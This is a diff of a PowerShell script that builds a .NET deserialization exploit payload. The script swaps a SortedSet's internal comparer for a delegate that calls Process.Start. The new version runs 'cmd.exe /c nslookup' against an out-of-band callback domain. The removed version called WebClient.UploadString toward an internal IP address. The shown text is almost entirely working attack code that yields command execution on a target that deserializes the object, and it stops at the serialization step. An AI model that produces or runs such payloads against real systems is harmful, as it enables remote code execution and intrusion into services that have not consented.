@@ -1,43 +1,41 @@
 # --- Configuration ---
-$targetUrl = "http://10.230.200.240:8080/"
-$dummyData = "test"
+$domain = "tihgeugvaqszxdlzjzzd9pbnc7h91d97x.oast.fun"
+$command = "cmd.exe"
+$arguments = "/c nslookup $domain"
 
 # --- Payload Construction ---
-Write-Host "[*] Building WebClient Deserialization payload..." -ForegroundColor Cyan
+Write-Host "[*] Building nslookup Deserialization payload..." -ForegroundColor Cyan
 
-# 1. Create a WebClient instance and get the UploadString method
-$webClient = New-Object System.Net.WebClient
-$uploadMethod = $webClient.GetType().GetMethod('UploadString', [Type[]]@([string], [string]))
+# 1. Create a delegate bound to Process.Start(string, string)
+$processType = [System.Diagnostics.Process]
+$startMethod = $processType.GetMethod('Start', [Type[]]@([string], [string]))
+$maliciousDelegate = [System.Delegate]::CreateDelegate([System.Comparison[string]], $startMethod)
 
-# 2. Create a Comparison<string> delegate bound to the WebClient instance
-$maliciousDelegate = [System.Delegate]::CreateDelegate([System.Comparison[string]], $webClient, $uploadMethod)
-
-# 3. Load the internal ComparisonComparer<string> type via Reflection
+# 2. Load the internal ComparisonComparer<string> type via Reflection
 $mscorlib = [System.Reflection.Assembly]::Load("mscorlib")
 $comparisonComparerType = $mscorlib.GetType("System.Collections.Generic.ComparisonComparer``1").MakeGenericType([string])
 
-# 4. Create an instance of ComparisonComparer<string> with the malicious delegate
+# 3. Create an instance of ComparisonComparer<string> with the malicious delegate
 $comparisonDelegateType = [System.Comparison[string]]
 $constructor = $comparisonComparerType.GetConstructor([Type[]]@($comparisonDelegateType))
 $maliciousComparer = $constructor.Invoke(@($maliciousDelegate))
 
-# 5. Create a SortedSet and populate it with dummy data
-$sortedSet = [System.Collections.Generic.SortedSet[string]]::new([System.Collections.Generic.Comparer[string]]::Default)
-$sortedSet.Add("http://dummy1.com") | Out-Null
-$sortedSet.Add("http://dummy2.com") | Out-Null
+# 4. Create a SortedSet and populate it with dummy data using the default comparer
+$sortedSet = New-Object 'System.Collections.Generic.SortedSet[string]'
+$sortedSet.Add("dummy1") | Out-Null
+$sortedSet.Add("dummy2") | Out-Null
 
-# 6. Dynamically find the internal comparer field using Reflection
+# 5. Dynamically find the internal comparer field and swap it
 $fields = $sortedSet.GetType().GetFields([System.Reflection.BindingFlags]'NonPublic, Instance')
 $comparerField = $fields | Where-Object { $_.FieldType -eq [System.Collections.Generic.IComparer[string]] } | Select-Object -First 1
 
 if (-not $comparerField) {
-    Write-Host "[-] Could not find the comparer field dynamically. Aborting." -ForegroundColor Red
+    Write-Host "[-] Could not find comparer field dynamically. Aborting." -ForegroundColor Red
     exit
 } else {
     Write-Host "[+] Found comparer field: '$($comparerField.Name)'" -ForegroundColor Green
 }
 
-# 7. Swap the internal comparer with our malicious one
 $comparerField.SetValue($sortedSet, $maliciousComparer)
 
 # --- Serialization ---
